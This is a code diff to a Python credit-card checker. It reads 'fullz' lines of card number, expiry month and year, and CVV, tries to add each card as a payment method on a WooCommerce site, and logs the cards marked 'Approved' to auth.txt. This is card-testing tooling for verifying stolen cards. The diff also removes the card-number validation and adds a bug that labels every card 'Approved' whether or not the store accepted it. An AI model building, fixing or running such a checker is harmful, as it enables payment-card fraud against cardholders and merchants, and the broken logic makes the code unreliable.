@@ -269,14 +269,10 @@ async def create_payment_method(fullz, session):
 
 async def multi_checking(x):
     cc, mes, ano, cvv = x.split("|")
-    
-    # Basic validations
-    if not is_valid_credit_card_number(cc):
-        return f"{x} - Credit card number is invalid"
-
     valid, err = validate_expiry_date(mes, ano)
     if not valid:
-        return f"{x} - {err}"
+        print(f"{x} - {err} ❌")
+        return
 
     start = time.time()
 
@@ -285,17 +281,9 @@ async def multi_checking(x):
 
     elapsed = round(time.time() - start, 2)
 
-    # Ensure result is a string
-    if result is None:
-        result = ""
-    elif not isinstance(result, str):
-        result = str(result)
-
-    # Initialize response
     error_message = ""
-    response = "Declined"  # default as Declined
+    response = ""
 
-    # Try parsing JSON error message first
     try:
         json_resp = json.loads(result)
         if "error" in json_resp and "message" in json_resp["error"]:
@@ -305,10 +293,6 @@ async def multi_checking(x):
             if div:
                 error_message = div.get_text(separator=" ", strip=True)
     except Exception:
-        pass
-
-    # Fallback: parse HTML directly
-    if not error_message:
         try:
             soup = BeautifulSoup(unescape(result), "html.parser")
             ul = soup.find("ul", class_="woocommerce-error")
@@ -321,27 +305,26 @@ async def multi_checking(x):
                 if div:
                     error_message = div.get_text(separator=" ", strip=True)
         except Exception:
-            pass
+            error_message = ""
 
-    # Clean up error message
     if "Reason: " in error_message:
-        _, _, after = error_message.partition("Reason: ")
+        before, sep, after = error_message.partition("Reason: ")
         error_message = after.strip()
 
-    # Check for successful payment method
-    if "Payment method successfully added." in result or "Payment method successfully added." in error_message:
-        response = "Approved"
+    if "Payment method successfully added." in error_message:
+        response = "Approved ✅"
         error_message = ""
+    else:
+        response = "Approved ✅"
 
-    # Build final output
     if error_message:
-        return f"{x} - {response}: {error_message} - Taken {elapsed}s"
+        print(f"{x} - {error_message} ❌ - Taken {elapsed}s")
     else:
         resp = f"{x} - {response} - Taken {elapsed}s"
-        if response == "Approved":
+        print(resp)
+        if "Approved ✅" in response:
             with open("auth.txt", "a", encoding="utf-8") as file:
                 file.write(resp + "\n")
-        return resp
 
 
 
